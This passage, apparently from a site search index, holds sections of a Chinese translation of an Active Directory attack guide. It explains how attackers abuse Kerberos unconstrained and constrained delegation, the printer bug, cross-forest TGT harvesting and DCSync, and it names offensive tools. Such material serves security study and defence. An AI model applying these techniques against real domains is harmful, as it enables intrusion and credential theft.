RPC\u63a5\u53e3\u7684\u7279\u5b9aRPC\u8c03\u7528\uff1a\u5373\u5141\u8bb8\u4efb\u4f55\u201c\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u201d\u5411\u76ee\u6807\u8ba1\u7b97\u673a\u6307\u793a\u8981\u901a\u8fc7SMB\u8fde\u63a5\u7684\u670d\u52a1\u5668\u7684\u8c03\u7528\u3002</p> <p>\u4e3a\u4e86\u89e6\u53d1\u6253\u5370\u673a\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u4f7f\u7528SpoolSample\u5de5\u5177\u6216printerbug.py\u811a\u672c\u3002\u6ce8\u610f\uff0c\u60a8\u5fc5\u987b\u5c06\u4e3b\u673a\u540d\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9\u76ee\u6807\u8ba1\u7b97\u673a\u624d\u80fd\u4f7f\u7528Kerberos\uff0c\u5982\u679c\u60a8\u63d0\u4f9b\u4e86IP\uff0c\u5219\u5c06\u4f7f\u7528NTLM\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u5e76\u4e14\u4e0d\u4f1a\u6267\u884c\u4efb\u4f55\u59d4\u6d3e\u3002\u6b64\u5916\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528SpoolerScan.ps1\u811a\u672c\u626b\u63cf\u542f\u7528\u4e86\u5047\u8131\u673a\u670d\u52a1\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5c06\u4f1a\u542f\u7528\u8be5\u670d\u52a1\uff09\u7684\u8ba1\u7b97\u673a\u3002</p> <p>\u6b64\u5916\uff0c\u53ef\u4ee5\u4f7f\u7528Rubeus monitor\u547d\u4ee4\u6765\u76d1\u89c6TGT\u3002</p> <p>\u540c\u65f6\uff0c\u8fd8\u53ef\u4ee5\u5728\u4e0d\u63a5\u89e6\u88ab\u5165\u4fb5\u670d\u52a1\u5668\u7684\u60c5\u51b5\u4e0b\u6536\u96c6TGT\u3002</p> <p>\u4e3a\u6b64\uff0c\u6211\u4eec\u9700\u8981\u4fee\u6539\u5df2\u7ecf\u5f97\u624b\u7684\u65e0\u7ea6\u675f\u59d4\u6d3e\u5e10\u6237\u7684SPN\u3002\u574f\u6d88\u606f\u662f\uff0c\u4e3a\u4e86\u6267\u884c\u8fd9\u4e2a\u64cd\u4f5c\uff0c\u5fc5\u987b\u5177\u6709Validated-SPN\u6743\u9650\uff0c\u5e76\u4e14\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u65e0\u6cd5\u5c06\u8be5\u6743\u9650\u6388\u4e88\u81ea\u5df1\u7684\u5e10\u6237\u3002\u4f46\u662f\uff0c\u5bf9\u4e8e\u8ba1\u7b97\u673a\u5e10\u6237\u6765\u8bf4\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5374\u53ef\u4ee5\u6dfb\u52a0\u4e0e\u5176\u4e3b\u673a\u540d\u5339\u914d\u7684SPN\uff1b\u5e78\u8fd0\u7684\u662f\uff0c\u5176\u4e2d\u5c31\u5305\u62ec\u6dfb\u52a0\u5230msDS-AdditionalDnsHostName\u4e2d\u7684\u4e3b\u673a\u540d\uff0c\u8fd9\u4e9b\u4e3b\u673a\u540d\u5141\u8bb8\u5e10\u6237\u672c\u8eab\u8fdb\u884c\u4fee\u6539\u3002\u7136\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u673a\u5668\u7684\u4e3b\u673a\u540d\u4f5c\u4e3a\u65b0\u4e3b\u673a\u540d\u8fdb\u884c\u6dfb\u52a0\uff0c\u5e76\u521b\u5efa\u6307\u5411\u673a\u5668\u7684SPN\u3002\u5b9e\u9645\u4e0a\uff0c\u6211\u4eec\u53ef\u4ee5\u501f\u52a9addspn.py\u6765\u5b8c\u6210\u8fd9\u4e00\u64cd\u4f5c\u3002\u53e6\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528setspn\u5b9e\u7528\u7a0b\u5e8f\u6765\u6dfb\u52a0SPN\u3002</p> <p>\u4e3a\u4e86\u4f7f\u4e3b\u673a\u540d\u6307\u5411\u6211\u4eec\u7684\u673a\u5668\uff0c\u53ef\u4ee5\u4f7f\u7528Powermad\u6216dnstool.py\u521b\u5efa\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684ADIDNS\u8bb0\u5f55\u3002</p> <p>\u7136\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6253\u5370\u673aBug\u6216\u9493\u9c7c\u6280\u672f\uff0c\u8ba9\u7528\u6237\u5bf9\u6211\u4eec\u7684\u670d\u52a1\u5668\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u6700\u540e\uff0c\u4e3a\u4e86\u6536\u96c6TGT\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528Krbrelayx\u3002</p> <p>\u4e00\u4e2a\u975e\u5e38\u6709\u8da3\u7684\u60c5\u51b5\u662f\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6253\u5370\u673aBug\u6765\u653b\u51fbDC\uff0c\u4f7f\u5176\u8fde\u63a5\u5230\u6211\u4eec\u63a7\u5236\u4e0b\u7684\u670d\u52a1\u5668\uff0c\u4ece\u800c\u8fbe\u5230\u5165\u4fb5\u57df\u7684\u76ee\u7684\u3002\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u60a8\u53ef\u4ee5\u83b7\u5f97DC\u5e10\u6237\u7684TGT\uff0c\u5e76\u901a\u8fc7\u5b83\u6765\u53d1\u52a8DCSync\u653b\u51fb\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#kerberos-unconstrained-delegation-across-forests","title":"Kerberos Unconstrained Delegation across forests","text":"<p>\u4e8b\u5b9e\u4e0a\uff0c\u8fd9\u79cd\u6280\u672f\u4e5f\u53ef\u4ee5\u7528\u4e8e\u542f\u7528\u4e86TGT\u59d4\u6d3e\u7684\u53cc\u5411\u6797\u4fe1\u4efb\u5173\u7cfb\uff0c\u4ece\u800c\u5165\u4fb5\u53e6\u4e00\u4e2a\u6797\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0cTGT\u59d4\u6d3e\u662f\u9ed8\u8ba4\u542f\u7528\u7684\uff1b\u4f46Microsoft\u5df2\u7ecf\u53d1\u5e03\u4e86\u4e00\u4e2a\u8865\u4e01\u7a0b\u5e8f\uff0c\u4f7fTGT\u59d4\u6d3e\u53d8\u4e3a\u9ed8\u8ba4\u7981\u7528\u4e86\u3002</p> <p>\u4e0b\u9762\u7ed9\u51fa\u4e86\u5728\u542f\u7528TGT\u59d4\u6d3e\u7684\u60c5\u51b5\u4e0b\u8de8\u57df\u6253\u5370\u673aBug\u653b\u51fb\u6240\u6d89\u53ca\u7684Kerberos\u6d88\u606f\u3002\u9996\u5148\uff0c\u653b\u51fb\u8005\u4ecebarsrv\u5411foosrv\u53d1\u9001\u4e00\u4e2aRPC\u8c03\u7528\uff0c\u4ee5\u547d\u4ee4\u6700\u540e\u4e00\u4e2a\u8c03\u7528\u8fde\u63a5\u5230udbarsrv\uff0c\u8be5\u8c03\u7528\u5df2\u7ecf\u65bd\u52a0\u4e86\u65e0\u7ea6\u675f\u59d4\u6d3e\u3002\u5b8c\u6210\u4e0a\u8ff0\u8c03\u7528\u540e\uff0c\u5c31\u53ef\u4ee5\u5728udbarsrv\u4e2d\u83b7\u5f97foosrv$\uff08foosrv\u7684\u57df\u7528\u6237\uff09\u7528\u6237\u7684TGT\u3002</p> <p>\u8be6\u7ec6\u6b65\u9aa4\u5982\u4e0b\u6240\u793a\uff1a</p> <p><code>.--1) TGS-REQ----------------&gt;  .---. &lt;-------8) TGS-REQ----------------.    |  + SPN: cifs/foosrv          /   /|   + SPN: cifs/udbarsrv            |     |                             .---. |   + TGT foosrv$ &gt; bar.com         |    |                             |   | '                                   |    | .------2) TGS-REP---------&lt; |   |/  &gt;-------9) TGS-REP--------------. |    | | + TGT barsrv$ &gt; foo.com   '---'     + ST foosrv$ &gt; cifs/udbarsrv  | |    | |                           KDC         - OK-AS-DELEGATE            | |    | |                          bar.com                                  | |    ^ v                                                                   | |    .---.                                                                 | |   /   /|  RpcRemoteFindFirstPrinterChangeNotification -&gt; udbarsrv        | |  .---. | ---------5) AP-REQ -------------------------------------------. | |  |   | '      + ST barsrv$ &gt; cifs/foosrv                               | | |  |   |/                                                                | | |  '---'                                                                 | | |  barsrv      .---.                                                     | | |  ^ v        /   /| &lt;-------12) AP-REQ--------------------.             | | |  | |       .---. |     + ST foosrv$ &gt; cifs/udbarsrv      |             | | |  | |       |   | '     + TGT foosrv$                     |             | | |  | |       |   |/        - FORWARDED                     |             v v ^  | |       '---'                                         '-----------&lt; .---.  | |      udbarsrv                 .--6) TGS-REQ--------------------&lt; /   /|  | |                               |  + SPN: cifs/udbarsrv           .---. |  | |                               |                                 |   | '  | |                               |  .----7) TGS-REP--------------&gt; |   |/   | |                               |  |  + TGT foosrv$ &gt; bar.com     '---'    | |                               v  ^    - OK-AS-DELEGATE          foosrv  | |                               .---.                              v ^  | '-------3) TGS-REQ-----------&gt; /   /|                              | |  |      + SPN: cifs/foosrv       .---. |&lt;-----10) TGS-REQ-------------' |  |      + TGT barsrv$ &gt; foo.com  |   | '  + SPN: krbtgt/foo.com         |  |                               |   |/                                 |  '--------4) TGS-REP-----------&lt; '---'  &gt;-----11) TGS-REP---------------'    + ST barsrv$ &gt; cifs/foosrv    KDC       + TGT foosrv$                                   foo.com      - FORWARDED</code></p> <p>\u5229\u7528\u6253\u5370\u673aBug\u53d1\u52a8\u5df2\u542f\u7528\u59d4\u6d3e\u7684\u8de8\u57df\u653b\u51fb\u65f6\u6d89\u53ca\u7684Kerberos\u6d88\u606f</p> <p><code>(\u4f4d\u4e8ebar.com\u57df\u4e2d\u7684)barsrv\u5411bar.com KDC\u53d1\u9001\u4e86\u4e00\u4e2aTGS-REQ\uff0c\u8981\u6c42\u4e3a\u4f7f\u7528foosrv\u7684SMB\u670d\u52a1(cifs)\u63d0\u4f9b\u4e00\u4e2a\u76f8\u5e94\u7684ST(\u56e0\u4e3a\u5229\u7528\u6253\u5370\u673aBug\u65f6\u9700\u8981\u4f7f\u7528SMB\u7684RPC)\u3002 bar.com KDC\u68c0\u67e5\u53d1\u73b0\u6240\u8bf7\u6c42\u7684\u670d\u52a1\u4f4d\u4e8e\u4fe1\u4efb\u57dffoo.com\u4e2d\uff0c\u5e76\u4e3a\u8be5\u57df\u7684barrv$\u9881\u53d1\u4e86\u4e00\u4e2aTGT\u3002 \u7136\u540e\uff0cbarrv\u901a\u8fc7\u7528\u4e8efoo.com\u57df\u7684TGT\u5411foo.com KDC\u8bf7\u6c42\u4e00\u4e2a\u7528\u4e8ecifs/foosrv\u670d\u52a1\u7684ST\u3002 \u4e4b\u540e\uff0cfoo.com KDC\u4f1a\u4e3abarrv$\u8fd4\u56de\u4e00\u4e2a\u7528\u4e8ecifs/foosrv\u670d\u52a1\u7684ST\u3002 \u7136\u540e\uff0cbarrv\u5bf9foosrv\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u5e76\u6267\u884c\u5229\u7528\u6253\u5370\u673aBug\u7684\u8c03\u7528\uff0c\u5373RpcRemoteFindFirstPrinterChangeNotification\uff0c\u8ba9foosrv\uff08\u5c5e\u4e8efoo.com\u57df\uff09\u901a\u8fc7SMB\u8fde\u63a5\u5230udbarsrv\u670d\u52a1\u5668\uff08\u5c5e\u4e8ebar.com\u57df\uff09\u3002 foosrv\u8981\u6c42foo.com KDC\u4e3audbarsrv\uff08cifs/udbarsrv\uff09\u7684SMB\u670d\u52a1\u63d0\u4f9b\u4e00\u4e2aST\u3002 foo.com KDC\u901a\u8fc7\u68c0\u67e5\u53d1\u73b0\u6240\u8bf7\u6c42\u7684\u670d\u52a1\u4f4d\u4e8e\u4fe1\u4efb\u57dfbar.com\u4e2d\uff0c\u56e0\u6b64\uff0c\u5c06\u4e3afoosrv$\u9881\u53d1\u4e00\u4e2a\u7528\u4e8e\u8be5\u57df\u7684TGT\u3002\u8fd9\u4e2aTGT\u5305\u62ecOK-AS-DELEGATE\u6807\u5fd7\uff0c\u8868\u660efoo.com\u4e3abar.com\u542f\u7528\u4e86TGT\u59d4\u6d3e\u3002 \u63a5\u4e0b\u6765\uff0cfoosrv\u4f7f\u7528\u65b0\u7684TGT\u8bf7\u6c42bar.com KDC\u4e3acifs/udbarsrv\u63d0\u4f9bST\u3002 bar.com KDC\u4e3afoosrv$\u8fd4\u56de\u4e00\u4e2a\u7528\u4e8ecifs/udbarsrv\u7684ST\u3002\u8fd9\u4e2aST\u8bbe\u7f6e\u4e86OK-AS-DELEGATE\u6807\u5fd7\uff0c\u8868\u660e\u8be5\u670d\u52a1\u4f7f\u7528\u4e86\u65e0\u7ea6\u675f\u59d4\u6d3e\u3002 \u56e0\u6b64\uff0cfoosrv\u68c0\u67e5cifs/udbarsrv\u662f\u5426\u4f7f\u7528\u59d4\u6d3e\uff0c\u4ee5\u53cabar.com\u7684\u59d4\u6d3e\u662f\u5426\u88ab\u5141\u8bb8\uff0c\u53d1\u73b0\u7b54\u6848\u90fd\u662f\u80af\u5b9a\u7684\uff0c\u6240\u4ee5\uff0c\u5b83\u5c06\u5411foo.com KDC\u8bf7\u6c42\u4e00\u4e2a\u8f6c\u53d1\u578bTGT\u3002 foo.com KDC\u5c06\u7528\u6237foosrv$\u7684TGT\u8fd4\u56de\u7ed9foosrv\u670d\u52a1\u5668\u3002 \u6700\u540e\uff0cfoosrv\u8fde\u63a5\u5230udbarsrv\u5e76\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u5305\u62ec\u5b83\u81ea\u5df1\u7684TGT\u3002\u73b0\u5728\uff0c\u8fd9\u53f0\u673a\u5668\u4e2d\u7684\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u6536\u96c6TGT\u5e76\u901a\u8fc7\u5b83\u6765\u8bbf\u95eefoosrv\u4e86\u3002</code></p> <p>\u5728\u672c\u4f8b\u4e2d\uff0cbarsrv\u548cudbarsrv\u662f\u4e0d\u540c\u7684\u670d\u52a1\u5668\uff0c\u8fd9\u662f\u4e3a\u4e86\u8868\u660e\u5b83\u4eec\u53ef\u4ee5\u662f\u4e0d\u540c\u7684\u673a\u5668\uff0c\u4f46\u662f\u6253\u5370\u673aBug\u4e5f\u53ef\u4ee5\u7528\u6765\u6307\u793a\u91cd\u65b0\u8fde\u63a5\u5230\u6267\u884cRPC\u8c03\u7528\u7684\u540c\u4e00\u53f0\u673a\u5668\u3002\u6b64\u5916\uff0cKDC\u4e5f\u53ef\u4ee5\u662f\u6267\u884c\u6216\u63a5\u6536\u6253\u5370\u673aBug\u76f8\u5173\u8c03\u7528\u7684\u670d\u52a1\u5668\u3002\u5728\u672c\u4f8b\u4e2d\uff0c\u4f7f\u7528\u4e86\u8bb8\u591a\u4e0d\u540c\u7684\u8ba1\u7b97\u673a\u6765\u5c55\u793a\u653b\u51fb\u4e2d\u7684\u5404\u79cdKerberos\u6d88\u606f\u548c\u89d2\u8272\u3002</p> <p>\u5728\u8fd9\u65b9\u9762\uff0c\u91cd\u8981\u7684\u662f\u8981\u77e5\u9053DC(KDC)\u542f\u7528\u4e86\u65e0\u7ea6\u675f\u59d4\u6d3e\uff0c\u6240\u4ee5\u4e00\u65e6\u67d0\u4e2a\u57dfDC\u906d\u5230\u5165\u4fb5\uff0c\u5c31\u53ef\u80fd\u5bfc\u81f4\u5176\u4ed6\u542f\u7528\u4e86TGT\u59d4\u6d3e\u7684\u3001\u5177\u6709\u53cc\u5411\u4fe1\u4efb\u5173\u7cfb\u7684\u6797\u4e5f\u968f\u4e4b\u6ca6\u9677\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#kerberos-constrained-delegation","title":"Kerberos Constrained Delegation","text":"<p>\u6b63\u5982\u6211\u4eec\u6240\u770b\u5230\u7684\uff0c\u65e0\u7ea6\u675f\u59d4\u6d3e\u53ef\u80fd\u662f\u6781\u5176\u5371\u9669\u7684\u4e1c\u897f\uff0c\u56e0\u4e3a\u53ef\u4ee5\u5229\u7528\u5b83\u6765\u5192\u5145\u5ba2\u6237\u7aef\u5e76\u884c\u4f7f\u5176\u5168\u90e8\u6743\u9650\u3002\u56e0\u6b64\uff0c\u4e3a\u4e86\u521b\u5efa\u4e00\u4e2a\u66f4\u5177\u9650\u5236\u6027\u7684\u59d4\u6d3e\u673a\u5236\uff0c\u5fae\u8f6f\u5f00\u53d1\u4e86\u4e24\u4e2a\u540d\u4e3aService for User\uff08S4U\uff09\u7684Kerberos\u6269\u5c55\uff1a</p> <p><code>Service for User to Proxy (S4U2proxy) Service for User to Self (S4U2self)</code></p> <p>\u901a\u8fc7\u4f7f\u7528\u8fd9\u4e9b\u6269\u5c55\uff0c\u53ef\u4ee5\u5c06\u670d\u52a1\u9650\u5236\u4e3a\u4ec5\u9488\u5bf9\u4e00\u7ec4\u5141\u8bb8\u7684\u7b2c\u4e09\u65b9\u670d\u52a1\u6267\u884c\u59d4\u6d3e\uff0c\u5e76\u4e14\u4e0d\u9700\u8981\u63d0\u4f9b\u7528\u6237TGT\uff0c\u8fd9\u6837\u5c31\u907f\u514d\u4e86\u5c06\u5176\u5b58\u50a8\u5728\u670d\u52a1\u670d\u52a1\u5668\u4e0a\u4e86\u3002\u8fd9\u5176\u5b9e\u5c31\u662f\u6240\u8c13\u7684\u7ea6\u675f\u59d4\u6d3e\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Attacking%20Active%20Directory%200%20to%200.9%EF%BC%88%E8%AF%91%E6%96%87%EF%BC%8C%E4%B8%8B%E7%AF%87%EF%BC%89/#s4u2proxy","title":"S4U2proxy","text":"<p>S4U2proxy(Service for User to Proxy\uff09\u6269\u5c55\u5141\u8bb8\u670d\u52a1\u901a\u8fc7\u4f7f\u7528\u53d1\u9001\u5230\u670d\u52a1\u7684\u5ba2\u6237\u7aefST\uff0c\u800c\u4e0d\u662f\u5ba2\u6237\u7aefTGT\uff0c\u4ee5\u201c\u4ee3\u8868\u201d\u5ba2\u6237\u7aef\u8bf7\u6c42\u53e6\u4e00\u4e2a\u670d\u52a1\u7684ST\u3002</p> <p>\u6b64\u5916\uff0c\u4e0e\u65e0\u7ea6\u675f\u59d4\u6d3e\u4e0d\u540c\uff0c\u670d\u52a1\u53ea\u80fd\u4e3a\u67d0\u4e9b\u767d\u540d\u5355\u4e2d\u7684\u670d\u52a1\u6765\u8bf7\u6c42\u201c\u5192\u540d\u201dST\u3002\u8fd9\u4e9b\u88ab\u5141\u8bb8\u7684\u670d\u52a1\u7531\u4ee5\u4e0b\u5c5e\u6027\u5b9a\u4e49\uff1a</p> <p>\u670d\u52a1\u7528\u6237\u5e10\u6237\u7684msDS-AllowedToDelegateTo\u5c5e\u6027\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u4e2aSPN\uff08\u670d\u52a1\uff09\u5217\u8868\uff0c\u4ee5\u6307\u51fa\u5b83\uff08\u53ca\u5176\u670d\u52a1\uff09\u53ef\u4ee5\u4ee3\u8868\u54ea\u4e9b\u5ba2\u6237\u7aef\u8bf7\u6c42ST\u3002\u8fd9\u4e2a\u670d\u52a1\u5217\u8868\u901a\u5e38\u7528\u4e8e\u7ecf\u5178\u7684\u7ea6\u675f\u59d4\u6d3e\u3002\u4e3a\u4e86\u4fee\u6539msDS-AllowedToDelegateTo\u5c5e\u6027\uff0c\u9700\u8981\u5177\u6709SeEnableDelegationPrivilege\u6743\u9650\u3002 \u76ee\u6807\u670d\u52a1\u7528\u6237\u5e10\u6237\u7684MSDS-AllowedToActonBeHalfOtherIdentity\u5c5e\u6027\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u4e2a\u670d\u52a1\u7528\u6237\u5e10\u6237\u5217\u8868\u3002\u8fd9\u4e2a\u7528\u6237\u5217\u8868\u901a\u5e38\u7528\u4e8e\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u59d4\u6d3e(RBCD)\u3002</p> <p>\u4ee5\u4e0b\u547d\u4ee4\uff08\u7528Powershell\u7684ActiveDirectory\u6a21\u5757\u521b\u5efa\uff09\u663e\u793a\u4e86\u8fd9\u4e9b\u5c5e\u6027\u7684\u4f8b\u5b50\uff1a</p> <p><code>PS C:\\Users\\Administrator&gt; get-aduser anakin -Properties msDS-AllowedToDelegateTo  DistinguishedName        : CN=Anakin,CN=Users,DC=contoso,DC=local msDS-AllowedToDelegateTo : {HTTP/webserver, HTTP/webserver.contoso.local} SamAccountName           : anakin SID                      : S-1-5-21-1372086773-2238746523-2939299801-1103 UserPrincipalName        : anakin@contoso.local</code></p> <p>msDS-AllowedToDelegateTo\u5c5e\u6027\u793a\u4f8b</p> <p>\u8fd9\u91cc\uff0c\u5141\u8bb8\u7528\u6237Anakin\u7684\u670d\u52a1\u5bf9\u201cHTTP/WebServer\u201d\u670d\u52a1\u8fdb\u884c\u59d4\u6d3e\u3002\u56e0\u6b64\uff0c\u5bf9\u4e8e\"HTTP/WebServer\"\u6765\u8bf4\uff0cAnakin\u53ef\u4ee5\u9488\u5192\u5145\u4efb\u4f55\u7528\u6237\uff08\u53d7\u4fdd\u62a4\u7684\u7528\u6237\u9664\u5916\uff09\u3002</p> <p><code>msDS-AllowedToDelegateTo                .---.                                        /   /|          \\o/      delegate to         .---. |           |  -----------------------&gt; |   | '          / \\                          |   |/          Anakn                         '---'                                       HTTP/webserver</code></p> <p>\u6b64\u5916\uff0c\u7531\u4e8e\u80fd\u591f\u4fee\u6539\u7968\u8bc1\u7684\u76ee\u6807\u670d\u52a1\uff0c\u6240\u4ee5\uff0cAnakin\u53ef\u4ee5\u5192\u5145\u5ba2\u6237\u7aef\u8bf7\u6c42\u201cHTTP/webserver\u201d\u7684\u7968\u8bc1\uff0c\u5e76\u5c06\u76ee\u6807\u670d\u52a1\u6539\u4e3a\u201cHTTP/webserver\u201d\u6240\u6709\u8005\u7684\u4efb\u4f55\u670d\u52a1\uff0c\u56e0\u4e3a\u6240\u6709\u8fd9\u4e9b\u670d\u52a1ST\u90fd\u662f\u4f7f\u7528\u76f8\u540c\u7684Kerberos\u5bc6\u94a5\u8fdb\u884c\u52a0\u5bc6\u7684\u3002</p> <p>\u4f8b\u5982\uff0c\u5982\u679c\u201cHTTP/webserver\u201d\u7684\u7528\u6237\u662fwebserver$(webserver\u8ba1\u7b97\u673a\u7684\u7528\u6237\u5e10\u6237\uff09\uff0c\u90a3\u4e48Anakin\u5c31\u80fd\u8fc7\u5192\u5145\u5ba2\u6237\u7aef\u6765\u8bf7\u6c42\u201cHTTP/webserver\u201d\u7684\u7968\u8bc1\uff0c\u5e76\u901a\u8fc7\u5c06\u76ee\u6807\u670d\u52a1\u6539\u4e3a\u201ccifs/webserver\u201d\u6765\u4f7f\u7528\u8be5\u7968\u8bc1\u8bbf\u95eewebserver\u7684SMB\u670d\u52a1\u3002\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0cAnakin\u5c31\u53ef\u4ee5\u901a\u8fc7\u5192\u5145\u5ba2\u6237\u7aef\u6765\u8bbf\u95eewebserver\u4e86\u3002</p> <p><code>PS C:\\Users\\Administrator&gt; get-aduser han -Properties PrincipalsAllowedToDelegateToAccount,msDS-AllowedToActOnBehalfOfOtherIdentity  DistinguishedName                        : CN=Han,CN=Users,DC=contoso,DC=local Enabled                                  : True GivenName                                : Han msDS-AllowedToActOnBehalfOfOtherIdentity : System.DirectoryServices.ActiveDirectorySecurity Name                                     : Han ObjectClass                              : user ObjectGUID                               : 356a7fb7-6cc0-4e09-a77f-b64e1677f2a8 PrincipalsAllowedToDelegateToAccount     : {CN=Anakin,CN=Users,DC=contoso,DC=local} SamAccountName                           : han SID                                      : S-1-5-21-1372086773-2238746523-2939299801-1109 Surname                                  : UserPrincipalName                        : han@contoso.local</code></p> <p>msDS-AllowedToActOnBehalfOfOtherIdentity\u793a\u4f8b</p> <p>\u7531\u4e8e\u503cmsDS-AllowedToActOnBehalfOfOtherIdentity\u662f\u4e8c\u8fdb\u5236\u683c\u5f0f\u7684\u5b89\u5168\u63cf\u8ff0\u7b26\uff0c\u6240\u4ee5\uff0c\u60a8\u9700\u8981\u8bf7\u6c42\u5c5e\u6027PrincipalsAllowedToDelegateToAccount\uff0c\u56e0\u4e3a\u8be5\u5c5e\u6027\u80fd\u591f\u4ee5\u53cb\u597d\u7684\u683c\u5f0f\u6253\u5370\u8be5\u6570\u636e\u3002</p> <p>\u53e6\u4e00\u65b9\u9762\uff0c\u901a\u8fc7\u68c0\u67e5\u7528\u6237Han\u7684msDS-AllowedToActOnBehalfOfotherIdentity\uff0c\u6211\u4eec\u53d1\u73b0\u5b83\u5141\u8bb8Anakin\u7528\u6237\u5bf9\u5176\u6240\u6709\u7684\u670d\u52a1\u8fdb\u884c\u59d4\u6d3e\u3002</p> <p>\u56e0\u6b64\uff0c\u5bf9\u7528\u6237Han\u7684\u4efb\u4f55\u670d\u52a1\u6765\u8bf4\uff0cAnakin\u90fd\u53ef\u4ee5\u5192\u5145\u4efb\u610f\u7528\u6237\uff08\u53d7\u4fdd\u62a4\u7684\u7528\u6237\u9664\u5916\uff09\u3002</p> <pre><code>                     `msDS-AllowedToActOnBehalfOfOtherIdentity    \\o/           delegate to                o    |   --------------------------------&gt;  /|\\    / \\                                     / \\  Anakin                                   Han`\n</code></pre> <p>\u6b64\u5916\uff0cKDC\u8fd8\u4f1a\u68c0\u67e5\u5176\u4ed6\u53c2\u6570\uff0c\u4ee5\u51b3\u5b9aS4U2proxy\u8bf7\u6c42\u7684\u7ed3\u679c\u3002\u6b64\u5916\uff0c\u5b83\u8fd8\u5c06\u8003\u8651\u5ba2\u6237\u7aefST\u662f\u5426\u53ef\u8f6c\u53d1\uff0c\u4ee5\u53ca\u5ba2\u6237\u7aef\u662f\u5426\u80fd\u591f\u8fdb\u884c\u59d4\u6d3e\uff0c\u8be6\u60c5\u53ef\u4ee5\u53c2\u9605MS-SFU\u89c4\u8303\u4e2d\u7684\u76f8\u5173\u89c4\u5219\u3002\u4e0b\u9762\uff0c\u6211\u4eec\u5bf9\u8fd9\u4e9b\u89c4\u5219\u8fdb\u884c\u7b80\u5355\u7684\u603b\u7ed3\uff1a</p> <ul> <li>\u5982\u679c\u5ba2\u6237\u7aefST\u7684PAC\u4e2d\u6ca1\u6709\u63d0\u4f9b\u6709\u6548\u7684\u7968\u8bc1\u7b7e\u540d =&gt; \u8fd4\u56de\u9519\u8befKRB-AP-ERR-MODIFIED\u3002</li> <li>\u5982\u679c\u5ba2\u6237\u7aefST\u4e0d\u53ef\u8f6c\u53d1\u5e76\u4e14\u5ba2\u6237\u7aef\u53d7\u5230\u4fdd\u62a4 =&gt; \u8fd4\u56de\u9519\u8befKRB-ERR-BADOPTION - STATUS-ACCOUNT-RESTRICTED\u3002</li> <li>\u5982\u679c\u5ba2\u6237\u7aefST\u4e0d\u53ef\u8f6c\u53d1\uff0c\u5e76\u4e14target_service\u4f4d\u4e8ems-AllowedToDelegateTo\u5c5e\u6027\u4e2d =&gt; \u8fd4\u56de\u9519\u8befKRB-ERR-BADOPTION - STATUS-ACCOUNT-RESTRICTED\u3002\uff08\u8fd9\u4e00\u6761\u89c4\u5219\u662f\u901a\u8fc7\u5b9e\u9a8c\u53d1\u73b0\u7684\uff09</li> <li>\u5982\u679cMS\u4e2d\u7684\u5ba2\u6237\u7aefST\u662f\u53ef\u8f6c\u53d1\u7684\uff0c\u5e76\u4e14target_service\u4f4d\u4e8ems-AllowedToDelegateTo\u5c5e\u6027\u4e2d =&gt; \u8fd4\u56deS4U2proxy ST\u3002</li> <li>\u5982\u679ctarget_service\u7528\u6237\u4f4d\u4e8etarget_service\u7528\u6237\u7684msDS-AllowedToActOnBehalfOfOtherIdentity\u5c5e\u6027\u4e2d =&gt; \u8fd4\u56deS4U2proxy ST\u3002</li> </ul> <p>\u5947\u602a\u7684\u662f\uff0c\u4f7f\u7528\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u59d4\u6d3e\uff08MSDS-AllowedtoActonBehalfoTherIdentity\uff09\uff0c\u80fd\u591f\u901a\u8fc7\u4e0d\u53ef\u8f6c\u53d1\u7684\u5ba2\u6237\u7aefST\u68c0\u7d22S4U2proxy ST\u3002\u9664\u975e\u76ee\u6807\u670d\u52a1\u4e5f\u5728ms-AllowedToDelegateTo\uff08\u89c4\u52193\uff09\u4e2d\u5217\u51fa\uff0c\u5426\u5219\u5c06\u8fd4\u56de\u9519\u8bef\u3002</p> <p>\u6b64\u5916\uff0c\u5728PAC Ticket Signature\u68c0\u67e5\u88ab\u5f15\u5165\u4e4b\u524d\uff0c\u670d\u52a1\u7528\u6237\u662f\u53ef\u4ee5\u4fee\u6539\u5ba2\u6237ST\u7684 (\u56e0\u4e3a\u5b83\u662f\u7528\u5176Kerberos\u5bc6\u94a5\u8fdb\u884c\u52a0\u5bc6\u7684)\uff0c\u5e76\u4f7f\u5176\u53ef\u8f6c\u53d1\u3002\u7136\u800c\uff0c\u5fae\u8f6f\u540e\u6765\u5728PAC\u4e2d\u5f15\u5165\u4e86\u8fd9\u4e2aTicket 